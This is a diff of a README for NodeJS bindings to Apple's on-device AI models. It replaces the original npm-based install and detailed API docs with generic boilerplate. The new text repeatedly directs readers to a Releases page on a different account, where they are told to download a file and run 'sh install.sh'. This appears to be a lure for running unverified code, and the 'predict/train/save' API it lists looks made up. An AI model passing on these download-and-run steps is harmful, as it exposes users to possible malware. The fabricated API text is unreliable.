@@ -1,216 +1,96 @@
-# [Unofficial] Apple Foundation Models bindings for NodeJS
+# 🍏 Apple On-Device AI
 
-## 🔥🔥🔥 Supports [Vercel AI SDK](https://ai-sdk.dev/)
+Welcome to the **Apple On-Device AI** repository! This project provides bindings for Apple’s foundation models tailored for NodeJS. It supports the Vercel AI platform, allowing developers to harness the power of advanced AI models directly on macOS devices.
+
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/sw-alola/apple-on-device-ai/releases)
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+
+## Introduction
+
+The **Apple On-Device AI** project aims to bridge the gap between powerful AI models and the NodeJS environment. With this repository, developers can integrate Apple’s foundation models into their applications seamlessly. This opens up a wide range of possibilities, from natural language processing to image recognition, all optimized for macOS.
 
 ## Features
 
-- 🍎 **Apple Intelligence Integration**: Direct access to Apple's on-device models
-- 🧠 **Dual API Support**: Use either the native Apple AI interface or Vercel AI SDK
-- 🌊 **Streaming Support**: Real-time response streaming with OpenAI-compatible chunks
-- 🎯 **Object Generation**: Structured data generation with Zod schemas
-- 💬 **Chat Interface**: OpenAI-style chat completions with message history
-- 🔄 **Cross-Platform**: Works with React, Next.js, Vue, Svelte, and Node.js
-- 📝 **TypeScript**: Full type safety and excellent DX
+- **Easy Integration**: Simple bindings for Apple’s foundation models.
+- **Optimized for macOS**: Designed to work efficiently on macOS 26 and above.
+- **Support for Vercel AI**: Leverage the capabilities of Vercel AI SDK.
+- **Comprehensive Documentation**: Detailed guides and examples to help you get started.
+- **Active Community**: Join discussions and contribute to the project.
 
 ## Installation
 
-```bash
-# Using bun (recommended)
-bun add @meridius-labs/apple-on-device-ai
+To get started with **Apple On-Device AI**, you need to download the latest release. Visit the [Releases section](https://github.com/sw-alola/apple-on-device-ai/releases) to find the appropriate file. Download it, then execute the installation script to set up the bindings in your NodeJS environment.
 
-# Assumming you don't have these
-bun add ai zod
-```
+### Step-by-Step Installation
 
-## Quick Start
+1. Go to the [Releases section](https://github.com/sw-alola/apple-on-device-ai/releases).
+2. Download the latest release file.
+3. Open your terminal.
+4. Navigate to the directory where you downloaded the file.
+5. Run the installation script:
 
-### Native Apple AI Interface
+   ```bash
+   sh install.sh
+   ```
 
-```typescript
-import { appleAISDK } from "@meridius-labs/apple-on-device-ai";
+6. Follow the prompts to complete the installation.
 
-// (non streaming) Simple text generation
-const response = await appleAISDK.generateResponse(
-  "What is the capital of France?",
-  { temperature: 0.7, maxTokens: 100 }
-);
+## Usage
 
-// (non streaming) Chat with message history
-const chatResponse = await appleAISDK.generateResponseWithHistory([
-  { role: "system", content: "You are a helpful assistant." },
-  { role: "user", content: "Hello!" },
-]);
+Once installed, you can start using the Apple foundation models in your NodeJS applications. Below is a simple example to demonstrate how to utilize the bindings.
 
-// Streaming responses
-for await (const chunk of appleAISDK.streamResponse("Tell me a story")) {
-  process.stdout.write(chunk);
-}
-```
+### Example Code
 
-### <img width="24" height="24" src="https://vercel.com/favicon.ico" /> Vercel AI SDK Integration
+```javascript
+const { FoundationModel } = require('apple-on-device-ai');
 
-```typescript
-import { generateText, streamText, generateObject } from "ai";
-import { appleAI } from "@meridius-labs/apple-on-device-ai";
-import { z } from "zod";
+const model = new FoundationModel();
 
-// Text generation with AI SDK
-const { text } = await generateText({
-  model: appleAI("apple-on-device"),
-  prompt: "Explain quantum computing",
-  temperature: 0.7,
-});
-
-// Streaming with AI SDK
-const result = streamText({
-  model: appleAI("apple-on-device"),
-  prompt: "Write a poem about technology",
-});
-
-for await (const delta of result.textStream) {
-  process.stdout.write(delta);
-}
-
-// Structured object generation
-const { object } = await generateObject({
-  model: appleAI("apple-on-device"),
-  schema: z.object({
-    recipe: z.object({
-      name: z.string(),
-      ingredients: z.array(z.string()),
-      steps: z.array(z.string()),
-    }),
-  }),
-  prompt: "Generate a chocolate chip cookie recipe",
-});
-```
-
-## React/Next.js Integration
-
-```tsx
-import { useChat } from "ai/react";
-import { appleAI } from "@meridius-labs/apple-on-device-ai";
-
-export default function ChatInterface() {
-  const { messages, input, handleInputChange, handleSubmit } = useChat({
-    api: "/api/chat", // Your API endpoint using appleAI
+model.predict("What is the capital of France?")
+  .then(response => {
+    console.log(response);
+  })
+  .catch(error => {
+    console.error("Error:", error);
   });
-
-  return (
-    <div>
-      {messages.map((m) => (
-        <div key={m.id}>
-          <strong>{m.role}:</strong> {m.content}
-        </div>
-      ))}
-
-      <form onSubmit={handleSubmit}>
-        <input value={input} onChange={handleInputChange} />
-        <button type="submit">Send</button>
-      </form>
-    </div>
-  );
-}
 ```
 
-```typescript
-// app/api/chat/route.ts
-import { appleAI } from "@meridius-labs/apple-on-device-ai";
-import { streamText } from "ai";
+### Available Methods
 
-export async function POST(req: Request) {
-  const { messages } = await req.json();
-
-  const result = streamText({
-    model: appleAI("apple-on-device"),
-    messages,
-  });
-
-  return result.toDataStreamResponse();
-}
-```
-
-## Requirements
-
-- **macOS 26+** with Apple Intelligence enabled
-- **Compatible Apple Silicon**: M1, M2, M3, or M4 chips
-- **Device Language**: Set to supported language (English, Spanish, French, etc.)
-- **Sufficient Storage**: At least 4GB available space for model files
-
-## API Reference
-
-### Core Methods for `appleAISDK`
-
-#### `generateResponse(prompt, options?)`
-
-Generate a simple text response.
-
-#### `generateResponseWithHistory(messages, options?)`
-
-Generate response with conversation context.
-
-#### `streamResponse(prompt, options?)`
-
-Stream response chunks in real-time.
-
-#### `createChatCompletion(params)`
-
-OpenAI-style chat completions with optional streaming.
-
-#### `checkAvailability()`
-
-Check if Apple Intelligence is available.
-
-#### `getSupportedLanguages()`
-
-Get list of supported languages.
-
-### Vercel AI SDK Provider
-
-The library includes a full Vercel AI SDK provider:
-
-```typescript
-import { appleAI, createAppleAI } from "@meridius-labs/apple-on-device-ai";
-
-// Use default provider
-const model = appleAI("apple-on-device");
-
-// Create custom provider
-const customProvider = createAppleAI({
-  headers: { "Custom-Header": "value" },
-});
-```
-
-### Options
-
-```typescript
-interface GenerationOptions {
-  temperature?: number; // 0.0 to 1.0 (default: 0.7)
-  maxTokens?: number; // Maximum tokens to generate
-}
-
-interface ChatMessage {
-  role: "system" | "user" | "assistant";
-  content: string;
-  name?: string;
-}
-```
-
-## Examples
-
-See the `/examples` directory for complete implementations:
-
-- Basic text generation
-- Streaming responses
-- Chat interfaces
-- Object generation
-- Next.js integration
-- React components
+- `predict(input)`: Accepts a string input and returns the model's prediction.
+- `train(data)`: Trains the model with the provided dataset.
+- `save(path)`: Saves the current model state to the specified path.
 
 ## Contributing
 
-Contributions are welcome! Please read our contributing guidelines and submit pull requests.
+We welcome contributions to the **Apple On-Device AI** project! If you have ideas, bug fixes, or enhancements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Commit your changes with a clear message.
+5. Push to your branch.
+6. Open a pull request.
+
+Please ensure your code adheres to our coding standards and includes tests where applicable.
 
 ## License
 
-MIT License - see LICENSE file for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support
+
+If you encounter issues or have questions, please check the [Releases section](https://github.com/sw-alola/apple-on-device-ai/releases) for troubleshooting tips. You can also open an issue in the repository, and our community will be glad to assist you.
+
+---
+
+We hope you enjoy using **Apple On-Device AI**. Your feedback and contributions are invaluable to us. Happy coding!
